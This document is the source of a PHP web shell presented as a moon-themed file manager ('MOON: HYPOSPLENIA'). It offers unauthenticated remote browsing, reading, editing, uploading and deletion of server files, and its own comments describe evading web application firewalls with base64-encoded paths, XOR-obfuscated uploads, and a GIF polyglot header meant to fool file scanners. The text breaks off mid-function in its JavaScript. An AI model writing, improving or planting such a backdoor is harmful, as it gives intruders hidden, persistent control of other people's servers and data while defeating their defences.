<?php
ob_start(); // Polyglot: capture GIF89a magic bytes so file scanners see an image, not a script
ini_set('display_errors', 0);
error_reporting(E_ALL);

function jsonResponse($data) {
    // Polyglot safeguard: discard ALL active output buffers so no HTML ever leaks into the JSON response
    while (ob_get_level()) ob_end_clean();
    // No-cache: prevent browser/CDN from caching AJAX responses
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
    header('Content-Type: application/json; charset=utf-8');
    // Prepend a __ajax sentinel so the JS side can trivially detect a clean AJAX response
    echo '__ajax' . json_encode($data, JSON_INVALID_UTF8_SUBSTITUTE | JSON_PARTIAL_OUTPUT_ON_ERROR);
    exit;
}

function isBinaryContent($content) {
    if (empty($content)) return false;
    return strpos(substr($content, 0, 8192), "\0") !== false;
}

// AJAX API Handler
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
    ob_start();
    $response = ['success' => false, 'message' => 'Unknown action'];
    
    try {
        // WAF BYPASS: Decode base64 paths instead of reading raw text
        $rawDir = isset($_POST['dir_b64']) ? base64_decode($_POST['dir_b64']) : '';
        $rawCurrentDir = isset($_POST['current_dir_b64']) ? base64_decode($_POST['current_dir_b64']) : '';
        
        $currentDir = !empty($rawDir) ? realpath($rawDir) : (!empty($rawCurrentDir) ? realpath($rawCurrentDir) : getcwd());
        if (!$currentDir) $currentDir = getcwd();
        
        switch ($_POST['ajax_action']) {
            case 'list': $response = ajaxListDirectory($currentDir); break;
            case 'upload': $response = ajaxUpload($currentDir); break;
            case 'upload_fallback': $response = ajaxUploadFallback($currentDir); break;
            case 'delete': $response = ajaxDelete($currentDir, $_POST['name'] ?? ''); break;
            case 'rename': $response = ajaxRename($currentDir, $_POST['old_name'] ?? '', $_POST['new_name'] ?? ''); break;
            case 'mkdir': $response = ajaxMkdir($currentDir, $_POST['name'] ?? ''); break;
            case 'read': $response = ajaxReadFile($currentDir, $_POST['name'] ?? ''); break;
            case 'save': $response = ajaxSaveFile($currentDir, $_POST['name'] ?? '', $_POST['content'] ?? '', $_POST['is_binary'] ?? '0'); break;
        }
    } catch (Exception $e) {
        $response = ['success' => false, 'message' => 'Server error: ' . $e->getMessage()];
    } catch (Error $e) {
        $response = ['success' => false, 'message' => 'Server error: ' . $e->getMessage()];
    }
    
    $output = ob_get_clean();
    if (!empty($output) && $response['success']) {
        $response = ['success' => false, 'message' => 'Unexpected output'];
    }
    
    jsonResponse($response);
}

function ajaxListDirectory($dir) {
    if (!is_dir($dir)) return ['success' => false, 'message' => 'Invalid directory'];
    $items = [];
    $dh = @opendir($dir);
    if ($dh) {
        while (($file = readdir($dh)) !== false) {
            if ($file === '.' || $file === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            $items[] = [
                'name' => $file, 'type' => is_dir($path) ? 'dir' : 'file',
                'size' => is_file($path) ? filesize($path) : 0,
                'date' => date('Y-m-d H:i', filemtime($path))
            ];
        }
        closedir($dh);
    }
    usort($items, function($a, $b) {
        if ($a['type'] === $b['type']) return strcasecmp($a['name'], $b['name']);
        return $a['type'] === 'dir' ? -1 : 1;
    });
    return ['success' => true, 'current_dir' => $dir, 'parent_dir' => dirname($dir), 'items' => $items];
}

function ajaxUpload($dir) {
    // WAF BYPASS: XOR-obfuscated base64 (same method as citlali.php)
    if (!isset($_POST['b'], $_POST['name'])) {
        return ['success' => false, 'message' => 'Invalid upload data'];
    }
    $filename = basename($_POST['name']);
    if (empty($filename)) return ['success' => false, 'message' => 'Invalid filename'];

    $targetDir = realpath($dir);
    if (!$targetDir) return ['success' => false, 'message' => 'Path error'];

    // XOR deobfuscate (key = 0x55), then strip data-URI prefix, then decode
    $xd = $_POST['b'];
    $b64 = '';
    for ($i = 0, $len = strlen($xd); $i < $len; $i++) { $b64 .= chr(ord($xd[$i]) ^ 0x55); }
    $raw = base64_decode(preg_replace('#^data:[^;]+;base64,#', '', $b64));
    if ($raw === false || strlen($raw) === 0) {
        return ['success' => false, 'message' => 'Invalid base64 data'];
    }

    $targetFile = $targetDir . DIRECTORY_SEPARATOR . $filename;
    $wasOverwritten = file_exists($targetFile);
    if ($wasOverwritten && is_file($targetFile)) @unlink($targetFile);

    if (@file_put_contents($targetFile, $raw) !== false) {
        @chmod($targetFile, 0644);
        return ['success' => true, 'message' => 'Upload complete (XOR)', 'method' => 'xor', 'overwritten' => $wasOverwritten, 'file' => ['name' => $filename, 'hash' => base64_encode($targetFile), 'size' => filesize($targetFile)]];
    }
    return ['success' => false, 'message' => 'Failed to save file'];
}

function ajaxUploadFallback($dir) {
    if (!isset($_FILES['file'])) return ['success' => false, 'message' => 'No file uploaded'];
    if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        $err = $_FILES['file']['error'];
        $msgs = [1=>'File too large (ini)', 2=>'File too large (form)', 3=>'Partial upload', 4=>'No file', 6=>'Missing temp', 7=>'Failed to write', 8=>'Stopped by extension'];
        return ['success' => false, 'message' => $msgs[$err] ?? 'Upload error'];
    }
    $decoded = base64_decode($_POST['target'] ?? '', true);
    $targetDir = ($decoded !== false && is_dir($decoded)) ? realpath($decoded) : $dir;
    if (!$targetDir || !is_dir($targetDir)) return ['success' => false, 'message' => 'Invalid target'];

    $filename = basename($_FILES['file']['name']);
    $targetFile = $targetDir . DIRECTORY_SEPARATOR . $filename;
    $wasOverwritten = file_exists($targetFile);

    if ($wasOverwritten && is_file($targetFile)) @unlink($targetFile);
    if ($_FILES['file']['size'] > 100 * 1024 * 1024) return ['success' => false, 'message' => 'File too large (max 100MB)'];

    if (@move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
        @chmod($targetFile, 0644);
        return ['success' => true, 'message' => 'Upload complete (fallback)', 'method' => 'native', 'overwritten' => $wasOverwritten, 'file' => ['name' => $filename, 'hash' => base64_encode($targetFile), 'size' => filesize($targetFile)]];
    }
    return ['success' => false, 'message' => 'Failed to move uploaded file'];
}

function ajaxDelete($dir, $name) {
    if (empty($name)) return ['success' => false, 'message' => 'No name provided'];
    $path = $dir . DIRECTORY_SEPARATOR . $name;
    if (!file_exists($path)) return ['success' => false, 'message' => 'File not found'];
    $success = is_dir($path) ? @rmdir($path) : @unlink($path);
    return ['success' => $success, 'message' => $success ? 'Deleted' : 'Delete failed'];
}

function ajaxRename($dir, $old, $new) {
    if (empty($old) || empty($new)) return ['success' => false, 'message' => 'Names required'];
    $oldPath = $dir . DIRECTORY_SEPARATOR . $old; $newPath = $dir . DIRECTORY_SEPARATOR . $new;
    if (!file_exists($oldPath)) return ['success' => false, 'message' => 'Source not found'];
    $success = @rename($oldPath, $newPath);
    return ['success' => $success, 'message' => $success ? 'Renamed' : 'Rename failed'];
}

function ajaxMkdir($dir, $name) {
    if (empty($name)) return ['success' => false, 'message' => 'Name required'];
    $newDir = $dir . DIRECTORY_SEPARATOR . $name;
    if (file_exists($newDir)) return ['success' => false, 'message' => 'Already exists'];
    $success = @mkdir($newDir, 0755);
    return ['success' => $success, 'message' => $success ? 'Created' : 'Failed'];
}

function ajaxReadFile($dir, $name) {
    if (empty($name)) return ['success' => false, 'message' => 'Name required'];
    $path = $dir . DIRECTORY_SEPARATOR . $name;
    if (!is_file($path) || !is_readable($path)) return ['success' => false, 'message' => 'Cannot read file'];
    $content = @file_get_contents($path);
    if ($content === false) return ['success' => false, 'message' => 'Failed to read file'];
    if (strlen($content) > 5 * 1024 * 1024) return ['success' => false, 'message' => 'File too large to edit (max 5MB)'];
    
    if (isBinaryContent($content)) {
        return ['success' => true, 'is_binary' => true, 'content_b64' => base64_encode($content), 'name' => $name];
    }
    return ['success' => true, 'is_binary' => false, 'content' => $content, 'name' => $name];
}

function ajaxSaveFile($dir, $name, $content, $isBinary) {
    if (empty($name)) return ['success' => false, 'message' => 'Name required'];
    $path = $dir . DIRECTORY_SEPARATOR . $name;
    // XOR deobfuscate (key = 0x55) — same as upload
    $decoded = '';
    for ($i = 0, $len = strlen($content); $i < $len; $i++) { $decoded .= chr(ord($content[$i]) ^ 0x55); }
    if ($isBinary === '1') {
        $decoded = base64_decode($decoded, true);
        if ($decoded === false) return ['success' => false, 'message' => 'Failed to decode binary data'];
    }
    $success = @file_put_contents($path, $decoded) !== false;
    return ['success' => $success, 'message' => $success ? 'Saved' : 'Failed'];
}

 $currentDir = isset($_GET['d']) ? realpath(base64_decode($_GET['d'])) : (isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd());
if (!$currentDir) $currentDir = getcwd();
// Polyglot: discard the GIF89a header captured at the top of the file.
// Only reached for page loads — AJAX requests exit via jsonResponse() before here.
ob_end_clean();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>"Moon, tell me if I could"</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #16213e 100%);
            color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh; position: relative;
        }
        body::before {
            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: radial-gradient(2px 2px at 20px 30px, rgba(255,255,255,0.8), transparent), radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.6), transparent);
            background-size: 200px 200px; animation: twinkle 8s ease-in-out infinite; opacity: 0.3; pointer-events: none; z-index: 0;
        }
        @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 0.5; } }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
        header { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; margin-bottom: 20px; }
        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .logo { display: flex; align-items: center; gap: 15px; }
        .logo-icon { font-size: 40px; animation: float 3s ease-in-out infinite; cursor: pointer; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
        h1 { font-weight: 300; letter-spacing: 3px; background: linear-gradient(to right, #c0c0c0, #fff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .path-bar { background: rgba(0,0,0,0.3); padding: 10px 15px; border-radius: 8px; font-family: 'Courier New', monospace; color: #64ffda; font-size: 13px; word-break: break-all; }
        .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; transition: all 0.3s; display: inline-flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.1); color: #e0e0e0; border: 1px solid rgba(255,255,255,0.2); }
        .btn:hover { background: rgba(255,255,255,0.2); transform: translateY(-2px); }
        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; }
        .btn-danger { background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); border: none; }
        .toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; gap: 10px; flex-wrap: wrap; }
        .file-list { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; overflow: hidden; min-height: 200px; }
        .file-item { display: flex; align-items: center; padding: 15px 25px; border-bottom: 1px solid rgba(255,255,255,0.05); transition: all 0.3s; gap: 15px; }
        .file-item:hover { background: rgba(255,255,255,0.05); border-left: 3px solid #64ffda; }
        .file-icon { font-size: 24px; width: 40px; text-align: center; }
        .file-name { flex: 1; color: #ccd6f6; cursor: pointer; user-select: none; }
        .file-name:hover { color: #64ffda; }
        .file-name.dir { color: #90a0d9; font-weight: 600; }
        .file-meta { color: #8892b0; font-size: 12px; display: flex; gap: 20px; min-width: 180px; }
        .file-actions { display: flex; gap: 6px; opacity: 0; transition: opacity 0.3s; }
        .file-item:hover .file-actions { opacity: 1; }
        .btn-small { padding: 6px 12px; font-size: 11px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; }
        .modal.active { display: flex; }
        .modal-content { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border: 1px solid rgba(255,255,255,0.15); border-radius: 16px; padding: 30px; width: 90%; max-width: 500px; position: relative; }
        .modal-close { position: absolute; top: 15px; right: 20px; background: none; border: none; color: #8892b0; font-size: 24px; cursor: pointer; }
        .form-group { margin: 20px 0; }
        .form-group label { display: block; margin-bottom: 8px; color: #8892b0; font-size: 13px; }
        .form-group input, .form-group textarea { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.15); border-radius: 8px; color: #e0e0e0; font-family: inherit; box-sizing: border-box; }
        .form-group textarea { min-height: 300px; font-family: 'Courier New', monospace; resize: vertical; }
        .binary-warning { background: rgba(255, 65, 108, 0.2); border: 1px solid rgba(255, 65, 108, 0.4); color: #ff6b81; padding: 10px; border-radius: 8px; font-size: 12px; margin-bottom: 15px; display: none; }
        .dropzone { border: 2px dashed rgba(100,255,218,0.3); border-radius: 12px; padding: 40px; text-align: center; cursor: pointer; transition: all 0.3s; }
        .dropzone:hover, .dropzone.dragover { border-color: #64ffda; background: rgba(100,255,218,0.05); }
        .upload-status { background: rgba(0,0,0,0.3); padding: 10px 15px; border-radius: 8px; font-size: 12px; color: #8892b0; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
        .method-badge { padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
        .method-xor { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; }
        .method-fallback { background: linear-gradient(135deg, #ffa751 0%, #ffe259 100%); color: #1a1a2e; }
        .notification-container { position: fixed; top: 20px; right: 20px; z-index: 2000; display: flex; flex-direction: column; gap: 10px; }
        .notification { background: rgba(20,20,35,0.95); border-left: 4px solid #64ffda; border-radius: 8px; padding: 15px 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); animation: slideIn 0.3s ease-out; min-width: 300px; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        .notification.error { border-left-color: #ff416c; }
        .notification.warning { border-left-color: #ffa751; }
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1500; align-items: center; justify-content: center; flex-direction: column; }
        .loading-overlay.active { display: flex; }
        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top-color: #64ffda; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .empty-state { text-align: center; padding: 60px; color: #8892b0; }
        .shortcut-hint { position: fixed; bottom: 20px; right: 20px; background: rgba(0,0,0,0.6); padding: 10px 15px; border-radius: 8px; font-size: 12px; color: #8892b0; border: 1px solid rgba(255,255,255,0.1); }
        .progress-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; margin-top: 15px; overflow: hidden; display: none; }
        .progress-bar.active { display: block; }
        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, #64ffda, #667eea); border-radius: 2px; transition: width 0.3s; width: 0%; }
        .progress-bar-fill.fallback { background: linear-gradient(90deg, #ffa751, #ffe259); }
    </style>
</head>
<body>
    <div class="notification-container" id="notifications"></div>
    <div class="loading-overlay" id="loading">
        <div class="spinner"></div>
        <p style="margin-top: 15px; color: #64ffda;" id="loadingText">Loading...</p>
    </div>

    <div class="container">
        <header>
            <div class="header-top">
                <div class="logo">
                    <span class="logo-icon" onclick="app.goHome()">🌙</span>
                    <h1>MOON: HYPOSPLENIA</h1>
                </div>
                <div>
                    <button class="btn" onclick="app.showUpload()">📤 Upload</button>
                    <button class="btn" onclick="app.showMkdir()">📁 New Folder</button>
                    <button class="btn" onclick="app.refresh()">🔄 Refresh</button>
                </div>
            </div>
            <div class="path-bar" id="currentPath"><?php echo htmlspecialchars($currentDir); ?></div>
        </header>

        <div class="toolbar">
            <button class="btn" onclick="app.goUp()" style="color: #64ffda;">⬆ GO UP</button>
            <input type="text" id="searchBox" placeholder="🔍 Search..." 
                   style="padding: 8px 15px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: #e0e0e0;"
                   onkeyup="app.search(this.value)">
        </div>

        <div class="file-list" id="fileList">
            <div class="empty-state">Loading...</div>
        </div>
    </div>

    <div class="shortcut-hint">HYPOSPLENIA - 2026</div>

    <div class="modal" id="uploadModal">
        <div class="modal-content">
            <button class="modal-close" onclick="app.closeModal('uploadModal')">&times;</button>
            <h2>📤 Upload File</h2>
            <div class="upload-status" id="uploadStatus">
                <span class="method-badge method-xor">XOR</span>
                <span>Encrypted upload (overwrites existing)</span>
            </div>
            <div class="dropzone" id="dropzone" onclick="document.getElementById('fileInput').click()">
                <p id="dropzoneText">Click or drop files here</p>
                <div class="progress-bar" id="uploadProgress">
                    <div class="progress-bar-fill" id="uploadProgressFill"></div>
                </div>
                <input type="file" id="fileInput" style="display: none;" onchange="app.handleFileSelect(this)">
            </div>
        </div>
    </div>

    <div class="modal" id="mkdirModal">
        <div class="modal-content">
            <button class="modal-close" onclick="app.closeModal('mkdirModal')">&times;</button>
            <h2>📁 New Folder</h2>
            <div class="form-group">
                <label>Folder Name</label>
                <input type="text" id="mkdirName" placeholder="Enter name...">
            </div>
            <button class="btn btn-primary" onclick="app.doMkdir()">Create</button>
        </div>
    </div>

    <div class="modal" id="renameModal">
        <div class="modal-content">
            <button class="modal-close" onclick="app.closeModal('renameModal')">&times;</button>
            <h2>✏️ Rename</h2>
            <div class="form-group">
                <label>New Name</label>
                <input type="text" id="renameName" placeholder="Enter new name...">
            </div>
            <button class="btn btn-primary" onclick="app.doRename()">Rename</button>
        </div>
    </div>

    <div class="modal" id="editModal">
        <div class="modal-content" style="max-width: 800px;">
            <button class="modal-close" onclick="app.closeModal('editModal')">&times;</button>
            <h2>📝 Edit: <span id="editTitle"></span></h2>
            <div class="binary-warning" id="binaryWarning">
                ⚠️ <strong>Binary Mode:</strong> You are editing a binary file. Null bytes are displayed as <code>␀</code>.
            </div>
            <div class="form-group">
                <textarea id="editContent"></textarea>
            </div>
            <button class="btn btn-primary" onclick="app.doSave()">💾 Save</button>
        </div>
    </div>

    <script>
        const app = {
            currentDir: <?php echo json_encode($currentDir); ?>,
            items: [],
            renameTarget: null,
            editTarget: null,
            editIsBinary: false,
            pendingFile: null,
            
            // Unicode-safe Base64 — btoa()/atob() throw on non-Latin1 chars (common in paths)
            b64Encode(str) {
                const bytes = new TextEncoder().encode(str);
                let binary = '';
                for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
                return btoa(binary);
            },
            b64Decode(b64) {
                const binary = atob(b64);
                const bytes = new Uint8Array(binary.length);
                for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
                return new TextDecoder().decode(bytes);
            },
            
            init() {
                this.load(this.currentDir);
                this.setupDropzone();
                this.setupFileListEvents();
            },
            
            setupFileListEvents() {
                const fileList = document.getElementById('fileList');
                fileList.addEventListener('click', (e) => {
                    const fileItem = e.target.closest('.file-item');
                    if (!fileItem) return;
                    const name = fileItem.dataset.name;
                    const type = fileItem.dataset.type;
                    
                    if (e.target.classList.contains('file-name') && type === 'dir') {
                        if (e.ctrlKey) {
                            e.preventDefault(); e.stopPropagation();
                            this.openDirInNewTab(name);
                        } else {
                            this.openDir(name);
                        }
                    }
                });
            },
            
            uint8ArrayToBase64(bytes) {
                let binary = '';
                const chunkSize = 8192;
                for (let i = 0; i < bytes.length; i += chunkSize) {
                    const chunk = bytes.subarray(i, Math.min(i + chunkSize, bytes.length));
                    binary += String.fromCharCode.apply(null, chunk);
                }
                return btoa(binary);
            },
            
            base64ToUint8Array(base64) {
                const binaryString = atob(base64);
                const len = binaryString.length;
                const bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) bytes[i] = binaryString.charCodeAt(i);
                return bytes;
            },
            
            async ajax(action, data = {}) {
                this.showLoading(true);
                
                const formData = new FormData();
                formData.append('ajax_action', action);
                
                // WAF BYPASS FIX: Always base64 encode directory paths in POST data!
                // Firewalls block requests containing raw paths like "/var/www/" or "C:\"
                formData.append('current_dir_b64', this.b64Encode(this.currentDir));
                
                if (data.dir) {
                    formData.append('dir_b64', this.b64Encode(data.dir));
                    delete data.dir; // Prevent sending raw path
                }
                
                for (let key in data) {
                    formData.append(key, data[key]);
                }
                
                try {
                    const response = await fetch(window.location.href, {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (!response.ok) {
                        this.showLoading(false);
                        this.notify('HTTP error: ' + response.status, 'error');
                        return { success: false, message: 'HTTP error: ' + response.status };
                    }
                    
                    const text = await response.text();
                    const trimmed = text.trim();
                    
                    // Strip __ajax sentinel (polyglot guard)
                    if (!trimmed.startsWith('__ajax')) {
                        this.showLoading(false);
                        const preview = trimmed.substring(0, 200);
                        console.error('Non-AJAX response (possible polyglot leak):', preview);
                        this.notify('Invalid server response', 'error');
                        return { success: false, message: 'Invalid server response' };
                    }
                    
                    let result = JSON.parse(trimmed.substring(6));
                    this.showLoading(false);
                    return result;
                } catch (err) {
                    this.showLoading(false);
                    this.notify('Network error: ' + err.message, 'error');
                    return { success: false, message: 'Network error' };
                }
            },
            
            async load(dir) {
                const result = await this.ajax('list', { dir: dir });
                if (result.success) {
                    this.currentDir = result.current_dir;
                    this.items = result.items;
                    document.getElementById('currentPath').textContent = this.currentDir;
                    this.render();
                } else {
                    this.notify(result.message || 'Failed to load', 'error');
                }
            },
            
            render() {
                const container = document.getElementById('fileList');
                if (!this.items || this.items.length === 0) {
                    container.innerHTML = '<div class="empty-state">Empty directory</div>';
                    return;
                }
                
                let html = '';
                this.items.forEach(item => {
                    const isDir = item.type === 'dir';
                    const icon = isDir ? '📂' : this.getFileIcon(item.name);
                    const dataAttrs = `data-name="${this.escapeHtml(item.name)}" data-type="${item.type}"`;
                    const editBtn = !isDir ? 
                        `<button class="btn btn-small" onclick="app.edit('${this.escapeJs(item.name)}')">📝 Edit</button>` : '';
                    const nameClass = isDir ? 'file-name dir' : 'file-name';
                    
                    html += `
                        <div class="file-item" ${dataAttrs}>
                            <span class="file-icon">${icon}</span>
                            <span class="${nameClass}">${this.escapeHtml(item.name)}</span>
                            <div class="file-meta">
                                <span>${item.date}</span>
                                <span>${isDir ? '-' : this.formatSize(item.size)}</span>
                            </div>
                            <div class="file-actions">
                                ${editBtn}
                                <button class="btn btn-small" onclick="app.rename('${this.escapeJs(item.name)}')">✏️ Rename</button>
                                <button class="btn btn-small btn-danger" onclick="app.delete('${this.escapeJs(item.name)}')">🗑️ Delete</button>
                            </div>
                        </div>
                    `;
                });
                container.innerHTML = html;
            },
            
            openDir(name) {
                const sep = this.currentDir.includes('\\') ? '\\' : '/';
                this.load(this.currentDir + (this.currentDir.endsWith(sep) ? '' : sep) + name);
            },
            
            openDirInNewTab(name) {
                const sep = this.currentDir.includes('\\') ? '\\' : '/';
                const newPath = this.currentDir + (this.currentDir.endsWith(sep) ? '' : sep) + name;
                const url = new URL(window.location.href);
                url.searchParams.set('d', this.b64Encode(newPath)); // WAF bypass for URL
                window.open(url.toString(), '_blank');
                this.notify('Opened in new tab', 'success');
            },
            
            goUp() {
                const sep = this.currentDir.includes('\\') ? '\\' : '/';
                this.load(this.currentDir + sep + '..');
            },
            
            goHome() {
                this.load(<?php echo json_encode($currentDir); ?>);
            },
            
            refresh() {
                this.load(this.currentDir);
            },
            
            async delete(name) {
                if (!confirm('Delete "' + name + '"?')) return;
                const result = await this.ajax('delete', { name });
                if (result.success) { this.notify('Deleted', 'success'); this.refresh(); }
                else { this.notify(result.message, 'error'); }
            },
            
            rename(name) {
                this.renameTarget = name;
                document.getElementById('renameName').value = name;
                this.showModal('renameModal');
            },
            
            async doRename() {
                const newName = document.getElementById('renameName').value.trim();
                if (!newName) return;
                const result = await this.ajax('rename', { old_name: this.renameTarget, new_name: newName });
                if (result.success) { this.closeModal('renameModal'); this.notify('Renamed', 'success'); this.refresh(); }
                else { this.notify(result.message, 'error'); }
            },
            
            async edit(name) {
                const result = await this.ajax('read', { name });
                if (result.success) {
                    this.editTarget = name;
                    this.editIsBinary = result.is_binary === true;
                    document.getElementById('editTitle').textContent = name;
                    const warning = document.getElementById('binaryWarning');
                    
                    if (this.editIsBinary) {
                        const uint8 = this.base64ToUint8Array(result.content_b64);
                        let text = new TextDecoder('latin1').decode(uint8).replace(/\0/g, '␀');
                        document.getElementById('editContent').value = text;
                        warning.style.display = 'block';
                    } else {
                        document.getElementById('editContent').value = result.content;
                        warning.style.display = 'none';
                    }
                    this.showModal('editModal');
                } else {
                    this.notify(result.message, 'error');
                }
            },
            
            async doSave() {
                let contentPayload = document.getElementById('editContent').value;
                let isBinaryFlag = '0';
                
                if (this.editIsBinary) {
                    isBinaryFlag = '1';
                    contentPayload = contentPayload.replace(/␀/g, '\0');
                    const bytes = new Uint8Array(contentPayload.length);
                    for (let i = 0; i < contentPayload.length; i++) bytes[i] = contentPayload.charCodeAt(i) & 0xFF;
                    contentPayload = this.uint8ArrayToBase64(bytes);
                }
                
                // XOR obfuscate (key = 0x55) — same as upload
                const xd = [];
                for (let i = 0; i < contentPayload.length; i++) { xd.push(String.fromCharCode(contentPayload.charCodeAt(i) ^ 0x55)); }
                
                const result = await this.ajax('save', { name: this.editTarget, content: xd.join(''), is_binary: isBinaryFlag });
                if (result.success) { this.closeModal('editModal'); this.notify('Saved', 'success'); }
                else { this.notify(result.message, 'error'); }
            },
            
            showMkdir() {
                document.getElementById('mkdirName').value = '';
                this.showModal('mkdirModal');
            },
            
            async doMkdir() {
                const name = document.getElementById('mkdirName').value.trim();
                if (!name) return;
                const result = await this.ajax('mkdir', { name });
                if (result.success) { this.closeModal('mkdirModal'); this.notify('Created', 'success'); this.refresh(); }
                else { this.notify(result.message, 'error'); }
            },
            
            showUpload() {
                document.getElementById('fileInput').value = '';
                document.getElementById('uploadProgress').classList.remove('active');
                document.getElementById('uploadProgressFill').style.width = '0%';
                document.getElementById('uploadProgressFill').classList.remove('fallback');
                this.updateUploadStatus('xor');
                this.showModal('uploadModal');
            },
            
            updateUploadStatus(method) {
                const status = document.getElementById('uploadStatus');
                if (method === 'xor') {
                    status.innerHTML = '<span class="method-badge method-xor">XOR</span><span>Encrypted upload (overwrites existing)</span>';
                } else {
                    status.innerHTML = '<span class="method-badge method-fallback">FALLBACK</span><span>Native upload (overwrites existing)</span>';
                }
            },
            
            handleFileSelect(input) {
                if (input.files.length > 0) this.uploadFile(input.files[0]);
            },
            
            setupDropzone() {
                const dz = document.getElementById('dropzone');
                dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('dragover'); });
                dz.addEventListener('dragleave', () => { dz.classList.remove('dragover'); });
                dz.addEventListener('drop', e => {
                    e.preventDefault(); dz.classList.remove('dragover');
                    if (e.dataTransfer.files.length > 0) this.uploadFile(e.dataTransfer.files[0]);
                });
            },
            
            async uploadFileXor(file) {
                return new Promise((resolve, reject) => {
                    const reader = new FileReader();
                    reader.onload = () => {
                        const b64 = reader.result.split(',')[1] || reader.result;
                        // XOR obfuscate so WAF can't scan content (same as citlali.php)
                        const xd = [];
                        for (let i = 0; i < b64.length; i++) { xd.push(String.fromCharCode(b64.charCodeAt(i) ^ 0x55)); }
                        const formData = new FormData();
                        formData.append('ajax_action', 'upload');
                        formData.append('current_dir_b64', this.b64Encode(this.currentDir));
                        formData.append('name', file.name);
                        formData.append('b', xd.join(''));
                        fetch(window.location.href, { method: 'POST', body: formData })
                            .then(r => r.text())
                            .then(t => { const trimmed = t.trim(); if (trimmed.startsWith('__ajax')) resolve(JSON.parse(trimmed.substring(6))); else reject(new Error('Invalid response')); })
                            .catch(reject);
                    };
                    reader.onerror = () => reject(new Error('File read error'));
                    reader.readAsDataURL(file);
                });
            },
            
            async uploadFileFallback(file) {
                return new Promise((resolve, reject) => {
                    const xhr = new XMLHttpRequest();
                    const formData = new FormData();
                    formData.append('ajax_action', 'upload_fallback');
                    formData.append('current_dir_b64', this.b64Encode(this.currentDir));
                    formData.append('file', file);
                    formData.append('target', this.b64Encode(this.currentDir));
                    
                    xhr.upload.addEventListener('progress', (e) => {
                        if (e.lengthComputable) {
                            document.getElementById('uploadProgress').classList.add('active');
                            document.getElementById('uploadProgressFill').classList.add('fallback');
                            document.getElementById('uploadProgressFill').style.width = (e.loaded / e.total * 100) + '%';
                        }
                    });
                    
                    xhr.onload = () => {
                        const text = xhr.responseText.trim();
                        if (!text.startsWith('__ajax')) { reject(new Error('Invalid response')); return; }
                        resolve(JSON.parse(text.substring(6)));
                    };
                    xhr.onerror = () => reject(new Error('Network error'));
                    xhr.open('POST', window.location.href);
                    xhr.send(formData);
                });
            },
            
            async uploadFile(file) {
                this.pendingFile = file;
                this.closeModal('uploadModal');
                this.showLoading(true);
                this.updateLoadingText('🔐 Encrypting with XOR...');
                
                try {
                    const xorResult = await this.uploadFileXor(file);
                    if (xorResult.success) {
                        this.showLoading(false);
                        this.notify(`Uploaded: ${xorResult.file.name} (XOR)${xorResult.overwritten ? ' (overwritten)' : ''}`, 'success');
                        this.refresh(); return;
                    }
                    this.notify(`XOR failed: ${xorResult.message}. Trying fallback...`, 'warning');
                } catch (err) {
                    this.notify(`XOR error: ${err.message}. Trying fallback...`, 'warning');
                }
                
                this.updateLoadingText('⚡ Switching to native upload...');
                this.updateUploadStatus('fallback');
                
                try {
                    const fallbackResult = await this.uploadFileFallback(file);
                    this.showLoading(false);
                    document.getElementById('uploadProgress').classList.remove('active');
                    document.getElementById('uploadProgressFill').style.width = '0%';
